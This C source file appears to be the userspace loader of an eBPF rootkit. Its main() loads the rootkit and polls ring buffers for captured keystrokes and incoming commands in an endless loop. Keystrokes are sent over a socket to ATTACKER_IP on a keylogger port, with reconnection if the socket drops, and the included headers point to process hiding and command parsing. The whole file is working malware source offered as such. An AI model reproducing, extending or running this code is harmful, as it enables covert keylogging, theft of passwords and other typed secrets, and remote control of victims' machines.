#include <bpf/libbpf.h>
#include <errno.h>
#include <linux/types.h>
#include <stdio.h>

#include "config.h"
#include "rootkit.skel.h"
#include "userspace/hider.h"
#include "userspace/keylogger_processor.h"
#include "userspace/command_parser.h"
#include "userspace/rootkit_loader.h"

#define RING_BUFF_POLL_TIMEOUT_MS 100

int main()
{
    struct rootkit* skel;

    skel = load_rootkit();
    if (!skel)
        return -EINVAL;

    struct keylogger_ctx ctx = {
        .keylogger_socket_fd = init_keylogger_sender_socket(ATTACKER_IP, KEYLOGGER_PORT),
    };

    struct ring_buffer* keylog_event_rb = ring_buffer__new(bpf_map__fd(skel->maps.keylog_events), process_key_event, &ctx, NULL);
    if (!keylog_event_rb) {
        unload_rootkit(skel);
        return -ENOMEM;
    }

    struct ring_buffer* command_event_rb = ring_buffer__new(bpf_map__fd(skel->maps.events), handle_received_command, NULL, NULL);
    if (!command_event_rb) {
        unload_rootkit(skel);
        return -ENOMEM;
    }

    while (1) {

        if (ctx.keylogger_socket_fd < 0)
            ctx.keylogger_socket_fd = init_keylogger_sender_socket(ATTACKER_IP, KEYLOGGER_PORT);

        ring_buffer__poll(keylog_event_rb, RING_BUFF_POLL_TIMEOUT_MS);
        ring_buffer__poll(command_event_rb, RING_BUFF_POLL_TIMEOUT_MS);
    }

    unload_rootkit(skel);

    return 0;
}
